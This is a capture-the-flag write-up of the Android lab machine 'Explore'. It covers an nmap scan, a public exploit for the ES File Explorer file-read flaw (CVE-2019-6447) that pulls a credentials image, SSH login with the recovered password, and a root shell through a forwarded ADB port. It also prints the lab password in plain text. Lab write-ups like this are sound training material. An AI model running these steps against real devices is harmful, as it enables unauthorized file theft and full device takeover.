# Explore (Easy - Android)

## Recon
### Nmap
```console
# nmap -Pn --open -sC -sV -p- 10.10.10.247 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-03 22:15 EST
Nmap scan report for 10.10.10.247
Host is up (0.016s latency).
Not shown: 65530 closed ports, 1 filtered port
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
2222/tcp  open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
42135/tcp open  http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
42843/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 04 Jan 2022 03:18:34 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Tue, 04 Jan 2022 03:18:34 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Tue, 04 Jan 2022 03:18:39 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 04 Jan 2022 03:18:54 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 04 Jan 2022 03:18:39 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 04 Jan 2022 03:18:54 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 04 Jan 2022 03:18:54 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ??random1random2random3random4
|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 04 Jan 2022 03:18:54 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
```

## Initial Access
### ES File Explorer - Arbitrary File Read 
The port 59777's ES File Explore service is vulnerable to [CVE-2019-6447](https://www.exploit-db.com/exploits/50070) vulnerability.

Reading images:
```console
# python3 exploit_file_explore.py listPics 10.10.10.247

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)

name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)

name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)

name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)
```

Downloading `creds.jpg`:
```console
# python3 exploit_file_explore.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg        

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

[+] Downloading file...
[+] Done. Saved as `out.dat`.
```

`kristi : Kr1sT!5h@Rp3xPl0r3!`

## SSH as kristi
```console
# hydra -l kristi -p 'Kr1sT!5h@Rp3xPl0r3!' -s 2222 ssh://10.10.10.247                                                                                                                                          255 ⨯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-03 22:43:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://10.10.10.247:2222/
[2222][ssh] host: 10.10.10.247   login: kristi   password: Kr1sT!5h@Rp3xPl0r3!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-03 22:43:15
```

```console
# sshpass -p 'Kr1sT!5h@Rp3xPl0r3!' ssh -p 2222 kristi@10.10.10.247
```

## Privesc
### ADB Shell

```console
sshpass -p 'Kr1sT!5h@Rp3xPl0r3!' ssh -p 2222 -L 5555:localhost:5555 kristi@10.10.10.247
```

Obtaining root shell via ADB (Android Debug) shell
```
adb connect localhost:5555
adb shell
su
```